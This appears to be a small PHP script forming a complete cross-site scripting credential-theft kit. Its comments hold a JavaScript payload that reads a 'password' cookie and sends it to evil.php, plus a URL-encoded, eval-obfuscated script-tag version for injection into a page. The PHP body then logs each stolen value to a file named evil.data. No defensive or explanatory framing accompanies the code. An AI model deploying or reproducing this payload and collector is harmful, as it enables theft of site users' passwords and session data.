<?php
// var a=YAHOO.util.Cookie.get("password");if(a){YAHOO.util.Connect.asyncRequest("GET","evil.php?c="+encodeURIComponent(a),{});}
// <script>eval(unescape(/var%20a%3DYAHOO.util.Cookie.get%28%22password%22%29%3Bif%28a%29%7BYAHOO.util.Connect.asyncRequest%28%22GET%22%2C%22evil.php%3Fc%3D%22+encodeURIComponent%28a%29%2C%7B%7D%29%3B%7D/.source))</script>
$myFile = "evil.data";
$fh = fopen($myFile, 'a') or die("can't open file");
$stringData = $_GET['c'] . "\n";
fwrite($fh, $stringData);
fclose($fh);
?>